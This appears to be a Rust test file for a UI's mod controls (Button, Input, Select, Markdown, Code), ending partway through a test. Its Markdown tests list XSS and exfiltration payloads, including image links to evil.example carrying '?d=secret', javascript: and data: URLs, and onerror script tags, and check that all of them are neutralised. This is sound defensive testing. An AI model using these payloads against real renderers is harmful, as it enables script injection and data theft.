//! A mod's Button, Input, Select, Markdown and Code (component 22, piece C): the Button, Input, "onInput", Select, Markdown and
//! Code cases of `ModTree.test.ts` and all of `mod-markdown.test.ts`, under their names. Fleet's tests read jsdom's CSS and DOM;
//! these read what the laid-out tree measures and what the controls sent.
use crate::fleet::mods::input_rate::{Change, InputRate, WINDOW};
use crate::fleet::mods::markdown::{code_head, fenced, has_image, is_live, live_links, source};
use crate::fleet::mods::types::{Action, ActionKind, Site};
use crate::mock::mod_trees::ModScene;
use crate::tests::{FRAME, app};
use crate::theme::Theme;
use pulldown_cmark::{Event, Options, Parser};
use rune::{ElementInfo, Key, KeyEvent, Mods, Runtime};
use serde_json::{Value, json};

fn control(kind: &str, props: Value, handles: Value) -> Value {
    json!({"type": kind, "props": props, "handles": handles})
}
fn leaf(kind: &str, props: Value) -> Value {
    json!({"type": kind, "props": props})
}
fn boxed(children: Vec<Value>) -> Value {
    json!({"type": "Box", "props": {}, "children": children})
}

fn show(tree: Value) -> Runtime<crate::State> {
    show_at(tree, Site::Pane)
}

fn show_at(tree: Value, site: Site) -> Runtime<crate::State> {
    let mut rt = app();
    rt.update(move |s, _| {
        s.show_mod_elements(true);
        s.set_mod_scene(Some(ModScene { tree, site, slot: true }));
    });
    for _ in 0..3 {
        rt.frame(FRAME);
    }
    rt
}

/// Draws a new tree in the same Mod tab.
fn redraw(rt: &mut Runtime<crate::State>, tree: Value) {
    rt.update(move |s, _| s.set_mod_scene(Some(ModScene { tree, site: Site::Pane, slot: true })));
    for _ in 0..3 {
        rt.frame(FRAME);
    }
}

fn info(rt: &Runtime<crate::State>, key: &str) -> ElementInfo {
    rt.elements().into_iter().find(|e| e.key.as_deref() == Some(key) && !e.exiting).unwrap_or_else(|| panic!("no element keyed {key:?}"))
}

fn has(rt: &Runtime<crate::State>, key: &str) -> bool {
    rt.elements().iter().any(|e| e.key.as_deref() == Some(key) && !e.exiting)
}

fn size(rt: &Runtime<crate::State>, key: &str) -> (f32, f32) {
    let r = info(rt, key).rect;
    (r[2], r[3])
}

fn sent(rt: &Runtime<crate::State>) -> Vec<Action> {
    rt.state.mods_ui.sent.clone()
}

fn values(rt: &Runtime<crate::State>) -> Vec<String> {
    sent(rt).into_iter().filter_map(|a| a.value).collect()
}

/// A click as a person's hand makes it: the pointer is over the control for a few frames before it goes down.
fn click(rt: &mut Runtime<crate::State>, key: &str) {
    let (x, y) = rt.find(key).unwrap_or_else(|| panic!("no element keyed {key:?}"));
    rt.pointer_move(x, y);
    for _ in 0..4 {
        rt.frame(FRAME);
    }
    rt.pointer_down(x, y);
    rt.pointer_up(x, y);
    rt.frame(FRAME);
}

fn press(rt: &mut Runtime<crate::State>, key: Key) {
    rt.key(KeyEvent { key, mods: Mods::default() });
    rt.frame(FRAME);
}

/// Types into the field the user clicked in, a character at a time.
fn typed(rt: &mut Runtime<crate::State>, text: &str) {
    for c in text.chars() {
        press(rt, Key::Text(c.to_string()));
    }
}

fn text_of(rt: &Runtime<crate::State>, key: &str) -> String {
    rt.state.mods_ui.field(key).map(|f| f.edit.text.clone()).unwrap_or_default()
}

fn any_text(rt: &Runtime<crate::State>, words: &str) -> bool {
    rt.elements().iter().any(|e| !e.exiting && e.text.as_deref().is_some_and(|t| t.contains(words)))
}

const FIRST: &str = "mod-tree.0";

// ---- Button ----------------------------------------------------------------------------------------------------------------

fn button(props: Value) -> Value {
    let mut p = json!({"key": "go", "label": "Run"});
    p.as_object_mut().unwrap().extend(props.as_object().unwrap().clone());
    control("Button", p, json!({"onPress": "h1"}))
}

// ModTree.test.ts, "Button": "emits a press with its handle"
#[test]
fn button_emits_a_press_with_its_handle() {
    let mut rt = show(button(json!({})));
    click(&mut rt, FIRST);
    assert_eq!(sent(&rt), [Action { handle: "h1".into(), kind: ActionKind::Press, value: None }]);
}

// ModTree.test.ts, "Button": "does nothing when disabled"
#[test]
fn button_does_nothing_when_disabled() {
    let mut rt = show(button(json!({"disabled": true})));
    click(&mut rt, FIRST);
    assert_eq!(sent(&rt), []);
    assert!((info(&rt, FIRST).opacity - 0.5).abs() < 0.01, "half strength");
}

// ModTree.test.ts, "Button": "puts the label in an inner span that ellipsizes, and shrinks with its row". At an inline site the
// button is one of a row that may shrink: a label too long for the line is cut, and the button stays 26 high.
#[test]
fn button_puts_the_label_in_an_inner_span_that_ellipsizes_and_shrinks_with_its_row() {
    let long = "A very long button label that goes on and on. ".repeat(10);
    let long = long.as_str();
    // At an inline site a lone button wider than its line is cut to it (a row of them wraps instead; that is B's rule).
    let lone = json!({"type": "Box", "props": {"width": "20%"}, "children": [button(json!({"label": long}))]});
    let rt = show_at(boxed(vec![lone]), Site::ToolUse);
    let key = "mod-tree.0.0.0";
    let (w, h) = size(&rt, key);
    assert_eq!(h, 26.0);
    let line = rt.presented("mod-tree.0.0").unwrap().0[2];
    assert!(w <= line + 0.5, "the button ({w}) stays inside its line ({line})");
    // The label is what gives way: its text element is narrower than the button.
    assert!(rt.elements().iter().any(|e| e.text.as_deref() == Some(long) && e.rect[2] < line));
    let short = show(button(json!({})));
    assert!(size(&short, FIRST).0 < 120.0, "a short label's button is as wide as its words and padding");
}

// ModTree.test.ts, "Button": "tone %s"
#[test]
fn button_tone_primary_danger_quiet() {
    let t = Theme::of(true);
    for (tone, fill, ink) in
        [("primary", t.accent, t.primary_fg), ("danger", t.error.alpha(0.16), t.error_text), ("quiet", rune::Color::TRANSPARENT, t.muted)]
    {
        let rt = show(button(json!({"tone": tone})));
        let b = info(&rt, FIRST);
        assert!((b.fill.a - fill.a).abs() < 0.01 && (b.fill.r - fill.r).abs() < 0.02, "{tone}: fill {:?} not {fill:?}", b.fill);
        let label = rt.elements().into_iter().find(|e| e.text.as_deref() == Some("Run") && e.rect[1] > b.rect[1] - 1.0).unwrap();
        let got = label.text_color.expect("the label has a colour");
        assert!((got.r - ink.r).abs() < 0.02 && (got.g - ink.g).abs() < 0.02, "{tone}: ink {got:?} not {ink:?}");
    }
}

// ModTree.test.ts, "Button": "is quiet by default and shows label and icon"
#[test]
fn button_is_quiet_by_default_and_shows_label_and_icon() {
    let t = Theme::of(true);
    let rt = show(button(json!({"icon": "play"})));
    assert_eq!(info(&rt, FIRST).fill.a, 0.0, "quiet has no fill");
    assert_eq!(info(&rt, FIRST).label.as_deref(), Some("Run"));
    assert!(any_text(&rt, "Run"));
    let plain = size(&show(button(json!({}))), FIRST).0;
    let with_icon = size(&rt, FIRST).0;
    assert!((with_icon - plain - 17.0).abs() < 1.0, "the 12 px icon and its 5 px gap: {plain} -> {with_icon}");
    assert_eq!(info(&rt, FIRST).role, "button");
    let _ = t;
}

// ---- Input -----------------------------------------------------------------------------------------------------------------

fn input(props: Value, handles: Value) -> Value {
    let mut p = json!({"key": "q"});
    p.as_object_mut().unwrap().extend(props.as_object().unwrap().clone());
    control("Input", p, handles)
}

const FIELD: &str = "mod-tree.0.field";

// ModTree.test.ts, "Input": "labels the field with a real label, with a placeholder and value"
#[test]
fn input_labels_the_field_with_a_real_label_with_a_placeholder_and_value() {
    let rt = show(input(json!({"label": "Filter", "placeholder": "type", "value": "abc"}), json!({"onSubmit": "sub"})));
    assert!(any_text(&rt, "Filter"), "the label is drawn");
    assert_eq!(info(&rt, FIELD).label.as_deref(), Some("Filter"), "the field is named by it");
    assert_eq!(text_of(&rt, FIRST), "abc");
    // Without a label the placeholder names the field (the placeholder itself is drawn by Rune inside the empty field).
    let empty = show(input(json!({"placeholder": "type"}), json!({"onSubmit": "sub"})));
    assert_eq!(info(&empty, FIELD).label.as_deref(), Some("type"));
    assert_eq!(info(&empty, FIELD).text.as_deref(), Some(""));
}

// ModTree.test.ts, "Input": "has no label element without a label"
#[test]
fn input_has_no_label_element_without_a_label() {
    let with = show(input(json!({"label": "Filter"}), json!({"onSubmit": "sub"})));
    let without = show(input(json!({}), json!({"onSubmit": "sub"})));
    assert!(!any_text(&without, "Filter"));
    // The label is 12 px muted over the field with 4 px between: the label's line is what the field box gets taller by.
    assert!(size(&with, FIRST).1 > size(&without, FIRST).1 + 4.0);
    assert_eq!(size(&without, FIRST).1, 30.0);
}

// ModTree.test.ts, "Input": "submits on Enter"
#[test]
fn input_submits_on_enter() {
    let mut rt = show(input(json!({"value": "a"}), json!({"onSubmit": "sub"})));
    click(&mut rt, FIELD);
    press(&mut rt, Key::Command('a'));
    typed(&mut rt, "hello");
    press(&mut rt, Key::Enter);
    assert_eq!(sent(&rt), [Action { handle: "sub".into(), kind: ActionKind::Submit, value: Some("hello".into()) }]);
}

// ModTree.test.ts, "Input": "submits with the button, labelled Submit by default"
#[test]
fn input_submits_with_the_button_labelled_submit_by_default() {
    let mut rt = show(input(json!({}), json!({"onSubmit": "sub"})));
    assert_eq!(info(&rt, "mod-tree.0.submit").label.as_deref(), Some("Submit"));
    click(&mut rt, FIELD);
    typed(&mut rt, "x");
    click(&mut rt, "mod-tree.0.submit");
    assert_eq!(sent(&rt), [Action { handle: "sub".into(), kind: ActionKind::Submit, value: Some("x".into()) }]);
}

// ModTree.test.ts, "Input": "takes the submit label"
#[test]
fn input_takes_the_submit_label() {
    let rt = show(input(json!({"submitLabel": "Search"}), json!({"onSubmit": "sub"})));
    assert_eq!(info(&rt, "mod-tree.0.submit").label.as_deref(), Some("Search"));
    assert!(any_text(&rt, "Search"));
    let (w, h) = size(&rt, "mod-tree.0.submit");
    assert_eq!(h, 30.0);
    assert!(w <= size(&rt, FIRST).0 / 2.0 + 0.5, "a short label is well inside half the row");
}

// ModTree.test.ts, "Input": "has no submit button or Enter action without onSubmit"
#[test]
fn input_has_no_submit_button_or_enter_action_without_on_submit() {
    let mut rt = show(input(json!({}), json!({"onInput": "inp"})));
    assert!(!has(&rt, "mod-tree.0.submit"));
    click(&mut rt, FIELD);
    press(&mut rt, Key::Enter);
    assert_eq!(sent(&rt), []);
}

// ModTree.test.ts, "Input": "keeps the user's typing until the tree's value changes"
#[test]
fn input_keeps_the_users_typing_until_the_trees_value_changes() {
    let tree = |v: &str| input(json!({"value": v}), json!({"onSubmit": "sub"}));
    let mut rt = show(tree("one"));
    click(&mut rt, FIELD);
    press(&mut rt, Key::Command('a'));
    typed(&mut rt, "typed");
    assert_eq!(text_of(&rt, FIRST), "typed");
    redraw(&mut rt, tree("one")); // same value, redrawn
    assert_eq!(text_of(&rt, FIRST), "typed");
    redraw(&mut rt, tree("two"));
    assert_eq!(text_of(&rt, FIRST), "two");
}

// ModTree.test.ts, "Input": "keeps room for a placeholder, yet shrinks below its container"
#[test]
fn input_keeps_room_for_a_placeholder_yet_shrinks_below_its_container() {
    // 10 em of the pane's 14 px text.
    let rt = show(input(json!({"placeholder": "a placeholder"}), json!({"onInput": "inp"})));
    assert!(size(&rt, FIRST).0 >= 140.0, "room to read a placeholder");
    // Inside a narrow Box it gives way below that rather than push the row wider.
    let narrow = json!({"type": "Box", "props": {"width": "10%"}, "children": [input(json!({}), json!({"onInput": "inp"}))]});
    let rt = show(boxed(vec![narrow]));
    let box_w = rt.presented("mod-tree.0.0").unwrap().0[2];
    assert!(size(&rt, "mod-tree.0.0.0").0 <= box_w.max(140.0) + 0.5);
}

// ---- onInput ---------------------------------------------------------------------------------------------------------------

fn typing_tree() -> Value {
    input(json!({}), json!({"onInput": "inp"}))
}

// the pure side of "onInput", at exact times (Fleet's use fake timers)
#[test]
fn on_input_sends_the_first_change_at_once_and_not_before_it_is_typed() {
    let mut rate = InputRate::default();
    assert_eq!(rate.due(0.0), None, "nothing before it is typed");
    assert_eq!(rate.changed(10.0, "a"), Change::Send("a".into()));
}

#[test]
fn on_input_coalesces_10_changes_in_a_second_to_at_most_4_and_the_last_value_always_goes() {
    let mut rate = InputRate::default();
    let mut times: Vec<f64> = Vec::new();
    let mut last = String::new();
    let mut now = 0.0;
    let tick = |rate: &mut InputRate, now: f64, times: &mut Vec<f64>, last: &mut String| {
        if let Some(v) = rate.due(now) {
            times.push(now);
            *last = v;
        }
    };
    for i in 1..=10 {
        match rate.changed(now, &format!("v{i}")) {
            Change::Send(v) => {
                times.push(now);
                last = v;
            }
            Change::Hold { .. } => {}
        }
        // 100 ms between changes, checking the timer every millisecond
        for _ in 0..100 {
            now += 0.001;
            tick(&mut rate, now, &mut times, &mut last);
        }
    }
    for _ in 0..1000 {
        now += 0.001;
        tick(&mut rate, now, &mut times, &mut last);
    }
    assert!(times.len() >= 2);
    assert_eq!(last, "v10");
    for start in &times {
        let inside = times.iter().filter(|t| **t >= *start && **t < start + 1.0).count();
        assert!(inside <= 4, "{inside} sends in the second from {start}");
    }
}

#[test]
fn on_input_holds_changes_in_the_window_and_sends_the_latest_when_it_ends() {
    let mut rate = InputRate::default();
    assert_eq!(rate.changed(0.0, "a"), Change::Send("a".into()));
    assert_eq!(rate.changed(0.0, "b"), Change::Hold { wake_in: Some(WINDOW) });
    assert_eq!(rate.changed(0.0, "c"), Change::Hold { wake_in: None }, "one timer for the window");
    assert_eq!(rate.due(0.249), None);
    assert_eq!(rate.due(0.25), Some("c".into()));
    assert_eq!(rate.due(0.26), None, "once");
}

#[test]
fn on_input_clears_its_timer_on_unmount_and_sends_the_last_pending_value_first() {
    let mut rate = InputRate::default();
    rate.changed(0.0, "a");
    rate.changed(0.0, "b");
    assert_eq!(rate.flush(), Some("b".into()));
    assert_eq!(rate.due(1.0), None, "the timer is gone");
    assert_eq!(rate.wait(0.0), None);
    assert_eq!(rate.flush(), None, "once");
}

#[test]
fn on_input_sends_nothing_on_unmount_when_nothing_is_pending() {
    let mut rate = InputRate::default();
    rate.changed(0.0, "a");
    assert_eq!(rate.flush(), None);
}

// the same through the field: typing reaches the mod as the clock allows
#[test]
fn on_input_typing_in_the_field_sends_the_first_change_at_once_then_the_latest_when_the_window_ends() {
    let mut rt = show(typing_tree());
    click(&mut rt, FIELD);
    assert_eq!(sent(&rt), []);
    typed(&mut rt, "a");
    assert_eq!(values(&rt), ["a"]);
    typed(&mut rt, "bc");
    assert_eq!(values(&rt), ["a"], "held inside the window");
    crate::test_wait::until_true("the held value to be sent when the window ends", || {
        rt.frame(0.02);
        values(&rt).len() == 2
    });
    assert_eq!(values(&rt), ["a", "abc"]);
    assert!(sent(&rt).iter().all(|a| a.kind == ActionKind::Input && a.handle == "inp"));
}

#[test]
fn on_input_sends_the_pending_value_when_a_redraw_removes_the_field() {
    let mut rt = show(boxed(vec![typing_tree()]));
    click(&mut rt, "mod-tree.0.0.field");
    typed(&mut rt, "a");
    typed(&mut rt, "b");
    typed(&mut rt, "last");
    assert_eq!(values(&rt), ["a"]);
    redraw(&mut rt, boxed(vec![json!({"type": "Text", "props": {}, "children": ["gone"]})]));
    assert_eq!(values(&rt), ["a", "ablast"]);
    for _ in 0..30 {
        rt.frame(0.05);
    }
    assert_eq!(values(&rt), ["a", "ablast"], "once");
}

#[test]
fn on_input_closing_the_pane_sends_what_it_still_held_and_nothing_when_nothing_is_pending() {
    let mut rt = show(typing_tree());
    click(&mut rt, FIELD);
    typed(&mut rt, "a");
    rt.update(|s, _| s.set_mod_scene(None));
    assert_eq!(values(&rt), ["a"], "nothing pending, nothing more");
    let mut rt = show(typing_tree());
    click(&mut rt, FIELD);
    typed(&mut rt, "a");
    typed(&mut rt, "b");
    rt.update(|s, _| s.set_mod_scene(None));
    assert_eq!(values(&rt), ["a", "ab"]);
}

// ---- Select ----------------------------------------------------------------------------------------------------------------

fn select(props: Value) -> Value {
    let mut p = json!({"key": "s", "options": [{"value": "a", "label": "Alpha"}, {"value": "b", "label": "Beta"}]});
    p.as_object_mut().unwrap().extend(props.as_object().unwrap().clone());
    control("Select", p, json!({"onSelect": "pick"}))
}

const TRIGGER: &str = "mod-tree.0.trigger";

// ModTree.test.ts, "Select": "draws the options, label and value"
#[test]
fn select_draws_the_options_label_and_value() {
    let mut rt = show(select(json!({"label": "Pick", "value": "b"})));
    assert!(any_text(&rt, "Pick"));
    assert_eq!(info(&rt, TRIGGER).label.as_deref(), Some("Beta"), "the value is selected");
    assert_eq!(size(&rt, TRIGGER).1, 30.0);
    click(&mut rt, TRIGGER);
    assert!(has(&rt, "mod-select-list-opt0") && has(&rt, "mod-select-list-opt1"));
    assert!(any_text(&rt, "Alpha") && any_text(&rt, "Beta"));
    assert!(!has(&rt, "mod-select-list-opt2"));
}

// ModTree.test.ts, "Select": "draws the options" with no label, the value for a label
#[test]
fn select_options_without_a_label_show_their_value() {
    // The validator wants a label on every option; the drawing still has Fleet's fallback (the value) for one that has none.
    let props = json!({"options": [{"value": "x"}, {"value": "y", "label": "Why"}, 3, {"label": "no value"}]});
    let got = crate::view::mods::controls::options(props.as_object().unwrap());
    assert_eq!(got, [("x".to_string(), "x".to_string()), ("y".to_string(), "Why".to_string())]);
}

// ModTree.test.ts, "Select": "emits a select"
#[test]
fn select_emits_a_select() {
    let mut rt = show(select(json!({})));
    click(&mut rt, TRIGGER);
    click(&mut rt, "mod-select-list-opt1");
    assert_eq!(sent(&rt), [Action { handle: "pick".into(), kind: ActionKind::Select, value: Some("b".into()) }]);
    assert_eq!(info(&rt, TRIGGER).label.as_deref(), Some("Beta"), "it shows the pick");
    // Picking what it already shows is no change.
    click(&mut rt, TRIGGER);
    click(&mut rt, "mod-select-list-opt1");
    assert_eq!(sent(&rt).len(), 1);
    // A new `value` from the mod replaces the pick; the same one redrawn keeps it.
    redraw(&mut rt, select(json!({})));
    assert_eq!(info(&rt, TRIGGER).label.as_deref(), Some("Beta"));
    redraw(&mut rt, select(json!({"value": "a"})));
    assert_eq!(info(&rt, TRIGGER).label.as_deref(), Some("Alpha"));
}

// ModTree.test.ts, "Select": "has no label element without a label"
#[test]
fn select_has_no_label_element_without_a_label() {
    let with = show(select(json!({"label": "Pick"})));
    let without = show(select(json!({})));
    assert!(!any_text(&without, "Pick"));
    assert!(size(&with, FIRST).1 > size(&without, FIRST).1 + 4.0);
}

// ModTree.test.ts, "Select": "shrinks with its row"
#[test]
fn select_shrinks_with_its_row() {
    let long = "An option label so long that the select cannot show all of it in a narrow row at all";
    let narrow =
        json!({"type": "Box", "props": {"width": "20%"}, "children": [select(json!({"options": [{"value": "a", "label": long}]}))]});
    let rt = show(boxed(vec![narrow]));
    let box_w = rt.presented("mod-tree.0.0").unwrap().0[2];
    assert!(size(&rt, "mod-tree.0.0.0.trigger").0 <= box_w + 0.5, "inside its row");
}

// ---- Markdown --------------------------------------------------------------------------------------------------------------

fn md(text: &str) -> Value {
    leaf("Markdown", json!({"text": text}))
}

/// The words a Markdown source reads as once the mod's rules are applied (`view.text()` in Fleet's tests).
fn words(src: &str) -> String {
    let mut out = String::new();
    for e in Parser::new_ext(&source(src), Options::empty()) {
        match e {
            Event::Text(t) | Event::Code(t) => out.push_str(&t),
            Event::SoftBreak | Event::HardBreak => out.push(' '),
            _ => {}
        }
    }
    out
}

// ModTree.test.ts, "Markdown": "draws Fleet's conversation Markdown"
#[test]
fn markdown_draws_fleets_conversation_markdown() {
    let rt = show(md("# Title\n\nSome **bold** and `code`"));
    assert!(rt.presented(FIRST).is_some());
    assert!(any_text(&rt, "Title"));
    // Rune lays the heading out larger than the body, as `.md-content` does.
    let heading = rt.elements().into_iter().find(|e| e.text.as_deref() == Some("Title")).unwrap();
    let body = rt.elements().into_iter().find(|e| e.text.as_deref().is_some_and(|t| t.contains("Some "))).unwrap();
    assert!(heading.rect[3] > body.rect[3]);
}

// ModTree.test.ts, "Markdown": "opens links in a new tab" (the app opens them outside, with no opener to give)
#[test]
fn markdown_opens_links_in_a_new_tab() {
    let links = live_links("[docs](https://example.com/a) and https://example.org/b");
    assert_eq!(links.len(), 1, "an explicit link; a bare address is Rune's autolink, which opens through the same handler");
    assert_eq!(links[0], "https://example.com/a");
    assert!(is_live("https://example.org/b"));
}

// ModTree.test.ts, "Markdown": "does not run HTML"
#[test]
fn markdown_does_not_run_html() {
    let rt = show(md("<img src=x onerror=alert(1)>"));
    assert!(!has_image("<img src=x onerror=alert(1)>"));
    assert!(rt.presented(FIRST).is_some());
}

// ModTree.test.ts, "Markdown": "dims"
#[test]
fn markdown_dims() {
    let t = Theme::of(true);
    let color = |props: Value| {
        let rt = show(leaf("Markdown", props));
        rt.elements().into_iter().find(|e| e.text.as_deref() == Some("x")).and_then(|e| e.text_color).expect("the paragraph's colour")
    };
    let dim = color(json!({"text": "x", "dimColor": true}));
    let plain = color(json!({"text": "x"}));
    assert!((dim.r - t.muted.r).abs() < 0.02 && (dim.g - t.muted.g).abs() < 0.02);
    assert!((plain.r - t.text.r).abs() < 0.02 && (plain.g - t.text.g).abs() < 0.02);
}

// mod-markdown.test.ts, "mod Markdown: no network": "draws no image for a %s image"
#[test]
fn draws_no_image_for_an_image_of_any_kind() {
    for (name, text) in [
        ("remote", "![x](https://evil.example/c?d=secret)"),
        ("http", "![x](http://evil.example/c.png)"),
        ("protocol-relative", "![x](//evil.example/y.png)"),
        ("data svg", "![x](data:image/svg+xml;base64,PHN2Zz4=)"),
        ("data png", "![x](data:image/png;base64,AAAA)"),
        ("relative", "![x](/api/sessions)"),
        ("reference style", "![a][r]\n\n[r]: https://evil.example/c?d=secret"),
        ("collapsed reference", "![a][]\n\n[a]: https://evil.example/c"),
        ("shortcut reference", "![a]\n\n[a]: https://evil.example/c"),
        ("with a title", "![x](https://evil.example/c \"t\")"),
        ("inside a link", "[![x](https://evil.example/c.png)](https://example.com)"),
        ("in a table", "| a |\n|---|\n| ![x](https://evil.example/c.png) |"),
        ("in a list", "- ![x](https://evil.example/c.png)"),
    ] {
        assert!(!has_image(text), "{name}: still an image in {:?}", source(text));
        // Nothing the drawn text can reach: the address is only ever in a definition Rune doesn't draw, or a live link's destination.
        let drawn = source(text);
        let links = live_links(text);
        assert!(links.iter().all(|l| !l.contains("evil.example")), "{name}: a link to the image's address");
        let _ = drawn;
    }
}

// mod-markdown.test.ts: "draws the alt text in place of the image"
#[test]
fn draws_the_alt_text_in_place_of_the_image() {
    assert_eq!(words("a ![the chart](https://evil.example/c.png) b"), "a the chart b");
    assert_eq!(words("![<b>x</b> & y](https://evil.example/c.png)"), "<b>x</b> & y");
    let rt = show(md("a ![the chart](https://evil.example/c.png) b"));
    assert!(any_text(&rt, "a the chart b"));
}

// mod-markdown.test.ts: "still renders the conversation's Markdown otherwise"
#[test]
fn still_renders_the_conversations_markdown_otherwise() {
    let rt = show(md("# Title\n\n**bold** and `code`\n\n- one\n- two\n\n```ts\nconst a = 1;\n```"));
    for words in ["Title", "one", "two", "const"] {
        assert!(any_text(&rt, words), "{words}");
    }
    let src = "# Title\n\n**bold** and `code`\n\n- one\n- two\n\n```ts\nconst a = 1;\n```";
    assert_eq!(source(src), src, "nothing to cut, nothing changed");
}

// mod-markdown.test.ts: "dims on dimColor" is `markdown_dims`.

// mod-markdown.test.ts: "leaves the conversation's renderer alone". The conversation's own Markdown is drawn from its source by
// `view::prose`, which this module never touches: the mod's rules rewrite a copy.
#[test]
fn leaves_the_conversations_renderer_alone() {
    let src = "![x](https://example.com/a.png)";
    let before = src.to_string();
    let _ = source(src);
    assert_eq!(src, before);
    assert!(has_image_in_source(src), "the conversation's own source still has its image");
    assert!(!has_image(src));
}

fn has_image_in_source(src: &str) -> bool {
    Parser::new_ext(src, Options::empty()).any(|e| matches!(e, Event::Start(pulldown_cmark::Tag::Image { .. })))
}

// mod-markdown.test.ts, "mod Markdown: links": "opens a web link in a new tab without the opener"
#[test]
fn opens_a_web_link_outside_without_the_opener() {
    let links = live_links("[site](https://example.com/a?b=c) and [again](http://example.org/x)");
    assert_eq!(links, ["https://example.com/a?b=c", "http://example.org/x"]);
}

// mod-markdown.test.ts: "keeps a mailto link"
#[test]
fn keeps_a_mailto_link() {
    assert_eq!(live_links("[mail](mailto:a@example.com)"), ["mailto:a@example.com"]);
}

// mod-markdown.test.ts: "%s is not a live link"
#[test]
fn a_script_or_file_address_is_not_a_live_link() {
    for text in [
        "[a](javascript:alert(1))",
        "[a](JaVaScRiPt:alert(1))",
        "[a](  javascript:alert(1))",
        "[a](java\tscript:alert(1))",
        "[a](vbscript:x)",
        "[a](data:text/html,<script>alert(1)</script>)",
        "[a](file:///etc/passwd)",
        "[a](&#106;avascript:alert(1))",
        "[a](javascript&colon;alert(1))",
        "<javascript:alert(1)>",
    ] {
        assert_eq!(live_links(text), Vec::<String>::new(), "{text:?}");
        assert!(!source(text).contains("](javascript") && !source(text).contains("](JaVa"), "{text:?} still a link in {:?}", source(text));
    }
}

// mod-markdown.test.ts: "%s is escaped, not HTML"
#[test]
fn html_is_text_not_html() {
    for text in [
        "<a href='javascript:alert(1)'>x</a>",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src='https://evil.example'></iframe>",
    ] {
        assert_eq!(live_links(text), Vec::<String>::new());
        assert!(!has_image(text));
        let rt = show(md(text));
        assert!(rt.presented(FIRST).is_some(), "{text:?} draws");
        assert!(any_text(&rt, "<"), "{text:?} is drawn as the characters it is");
    }
}

// mod-markdown.test.ts: "draws a file reference, an app path, an anchor and a protocol-relative link as plain text"
#[test]
fn a_file_an_app_path_an_anchor_and_a_protocol_relative_link_are_plain_text() {
    let src = "see [x](src/app.ts) and [y](/api/sessions) and [z](#top) and [w](//evil.example/q) and `src/app.ts:3`";
    assert_eq!(live_links(src), Vec::<String>::new());
    assert_eq!(words(src), "see x and y and z and w and src/app.ts:3");
}

// mod-markdown.test.ts: "keeps the text of a dead link and the live links around it"
#[test]
fn keeps_the_text_of_a_dead_link_and_the_live_links_around_it() {
    let src = "[a](src/a.ts) [b](https://example.com) [c](src/c.ts)";
    assert_eq!(live_links(src), ["https://example.com"]);
    assert_eq!(words(src), "a b c");
}

// mod-markdown.test.ts: "does not mark file references even when asked to (no env)"
#[test]
fn does_not_mark_file_references_even_when_asked_to() {
    // No Files is given to a mod's Markdown (`rich::markdown` wires only web links): a path in code is code, not a link.
    let src = "`src/app.ts:3` [x](src/app.ts)";
    assert_eq!(live_links(src), Vec::<String>::new());
    let rt = show(md(src));
    assert!(any_text(&rt, "src/app.ts:3"));
}

// ---- Code ------------------------------------------------------------------------------------------------------------------

fn code(props: Value) -> Value {
    leaf("Code", props)
}

// ModTree.test.ts, "Code": "draws source in Fleet's code block"
#[test]
fn code_draws_source_in_fleets_code_block() {
    let rt = show(code(json!({"source": "const a = 1;\nlet b = 2;", "language": "typescript"})));
    assert!(any_text(&rt, "const a = 1;"));
    assert!(any_text(&rt, "let b = 2;"));
}

// ModTree.test.ts, "Code": "survives backtick fences inside the source"
#[test]
fn code_survives_backtick_fences_inside_the_source() {
    let src = "before\n```\ninner\n```\nafter";
    let fence = fenced(src, "");
    assert!(fence.starts_with("````\n") && fence.ends_with("\n````"), "a longer fence: {fence:?}");
    let rt = show(code(json!({"source": src})));
    assert!(any_text(&rt, "inner") && any_text(&rt, "after"));
    assert_eq!(fenced("x", "type script!{}"), "```typescript\nx\n```", "only a language's own characters");
    assert_eq!(fenced("x", "c++ c# a.b-c_d"), "```c++c#a.b-c_d\nx\n```");
}

// ModTree.test.ts, "Code": "has a header with the path and start line"
#[test]
fn code_has_a_header_with_the_path_and_start_line() {
    assert_eq!(code_head(Some("src/app.ts"), Some(12.0)).as_deref(), Some("src/app.ts:12"));
    assert_eq!(code_head(Some("src/app.ts"), None).as_deref(), Some("src/app.ts"));
    assert_eq!(code_head(None, Some(3.0)), None);
    let rt = show(code(json!({"source": "x", "path": "src/app.ts", "startLine": 12})));
    assert_eq!(info(&rt, "mod-tree.0.head").text.as_deref(), Some("src/app.ts:12"));
    let rt = show(code(json!({"source": "x", "path": "src/app.ts"})));
    assert_eq!(info(&rt, "mod-tree.0.head").text.as_deref(), Some("src/app.ts"));
    assert!(!has(&show(code(json!({"source": "x"}))), "mod-tree.0.head"));
}

// ModTree.test.ts, "Code": "wraps by default and keeps lines whole on truncate"
#[test]
fn code_wraps_by_default_and_keeps_lines_whole_on_truncate() {
    let long = "a_line_with_no_break ".repeat(30);
    let wrapped = show(code(json!({"source": long.clone()})));
    let whole = show(code(json!({"source": long.clone(), "wrap": "truncate"})));
    let height = |rt: &Runtime<crate::State>| size(rt, "mod-tree.0.body").1;
    assert!(height(&wrapped) > height(&whole) + 10.0, "wrapping makes it taller: {} vs {}", height(&wrapped), height(&whole));
    // The page never scrolls sideways: the block is no wider than the pane.
    let pane = wrapped.presented("mod-tree").unwrap().0[2];
    assert!(size(&whole, "mod-tree.0.body").0 <= pane + 0.5);
}

// ModTree.test.ts, "Code": "draws a diff with Fleet's diff view"
#[test]
fn code_draws_a_diff_with_fleets_diff_view() {
    let patch = "--- a/f.txt\n+++ b/f.txt\n@@ -1,2 +1,2 @@\n keep\n-old\n+new\n";
    let rt = show(code(json!({"source": patch, "format": "diff", "path": "f.txt"})));
    assert_eq!(info(&rt, "mod-tree.0.head").text.as_deref(), Some("f.txt"));
    assert!(has(&rt, "mod-tree.0.diff-line-0") && has(&rt, "mod-tree.0.diff-line-1") && has(&rt, "mod-tree.0.diff-line-2"));
    assert!(!has(&rt, "mod-tree.0.diff-line-3"));
    assert!(!has(&rt, "mod-tree.0.body"), "no code block");
    assert!(any_text(&rt, "old") && any_text(&rt, "new"));
}

// The quirk kept (`docs/parity/22-mods.md`, 3.8): a diff with no `@@` header numbers its lines 0.
#[test]
fn a_diff_with_no_hunk_header_numbers_its_lines_0() {
    let lines = crate::conv::diff::parse_unified_diff("--- a/f\n+++ b/f\n-old\n+new\n").lines;
    assert!(lines.iter().all(|l| l.old.is_none_or(|n| n == 0) && l.new.is_none_or(|n| n == 0)), "{lines:?}");
}

// ---- the whole pane --------------------------------------------------------------------------------------------------------

#[test]
fn the_controls_pane_draws_every_control_of_the_standin_tree() {
    let mut rt = app();
    rt.update(|s, _| s.show_mod_controls(true));
    for _ in 0..4 {
